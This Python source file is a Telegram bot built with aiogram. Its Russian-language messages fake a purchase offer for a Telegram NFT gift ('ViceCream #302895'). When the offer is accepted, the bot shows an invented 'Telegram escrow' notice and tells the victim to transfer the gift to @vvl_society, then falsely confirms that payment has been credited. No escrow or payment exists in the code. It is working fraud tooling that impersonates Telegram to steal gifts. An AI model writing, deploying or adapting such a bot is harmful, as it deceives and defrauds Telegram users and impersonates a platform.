import asyncio
import logging
import os
from aiohttp import web
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Токен будет браться из переменных окружения Render
BOT_TOKEN = os.environ.get("BOT_TOKEN")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

active_deals = {}

@dp.message(Command("buy"))
async def cmd_buy(message: types.Message):
    args = message.text.split()
    if len(args) < 4:
        await message.answer("⚠️ Использование: `/buy <ссылка> <сумма> <валюта>`\nПример: `/buy https://t.me/nft/ViceCream-302895 1000 STARS`")
        return

    nft_link = args[1]
    amount = args[2]
    currency = args[3].upper()

    text = (
        f"<b>Telegram\nVice Cream #302895</b>\n\n"
        f"Пользователь предлагает вам\n"
        f"<b>{amount} {currency}</b> за подарок <b>ViceCream #302895</b>.\n\n"
        f"Оффер действителен ещё 6 ч. 0 мин."
    )

    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"decline_{message.from_user.id}"),
        InlineKeyboardButton(text="✅ Принять", callback_data=f"accept_{message.from_user.id}")
    )

    active_deals[str(message.from_user.id)] = {"link": nft_link, "amount": amount, "currency": currency}
    await message.answer(text, reply_markup=builder.as_markup(), parse_mode="HTML")

@dp.callback_query(F.data.startswith("decline_"))
async def process_decline(callback: CallbackQuery):
    await callback.message.edit_text("❌ Предложение отклонено")
    await callback.answer()

@dp.callback_query(F.data.startswith("accept_"))
async def process_accept(callback: CallbackQuery):
    await callback.answer(
        text="Внимание!\n\nСледуйте инструкции, чтобы не потерять подарок и получить оплату.\n\nНажмите «ОК», если вы прочитали это сообщение.",
        show_alert=True
    )
    await asyncio.sleep(1.5)
    
    deal_id = callback.data.split("_")[1]
    deal = active_deals.get(deal_id)
    if not deal:
        await callback.message.edit_text("⚠️ Ошибка: данные о сделке утеряны.")
        return

    final_text = (
        f"<b>NFT Deal</b>\n\nОрдер #TG-D721BSTP\n\n"
        f"Покупатель зарезервировал <b>{deal['amount']} {deal['currency']}</b> через эскроу-систему Telegram.\n"
        f"Средства хранятся на специальном эскроу-счёте и будут автоматически зачислены на ваш баланс Telegram Stars сразу после передачи подарка.\n\n"
        f"<b>Инструкция для завершения сделки:</b>\n"
        f"1. Передайте подарок пользователю: @vvl_society\n"
        f"2. Нажмите «Передать NFT» и выберите ViceCream #302895\n"
        f"3. Подтвердите передачу подарка.\n\n"
        f"Telegram зафиксирует транзакцию и моментально зачислит {deal['amount']} {deal['currency']} на ваш баланс. Резерв действует 24 часа."
    )

    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="Передать NFT", url=deal["link"]))
    builder.row(InlineKeyboardButton(text="Подтвердить передачу", callback_data=f"confirm_{deal_id}"))

    await callback.message.edit_text(final_text, reply_markup=builder.as_markup(), parse_mode="HTML")

@dp.callback_query(F.data.startswith("confirm_"))
async def process_confirm(callback: CallbackQuery):
    await callback.answer("✅ Транзакция подтверждена!", show_alert=True)
    await callback.message.edit_text("✅ Сделка завершена. Средства зачислены на ваш баланс.")

# --- Веб-сервер для Render ---
async def handle(request):
    return web.Response(text="Bot is alive!")

async def main():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', int(os.environ.get("PORT", 8080)))
    await site.start()
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())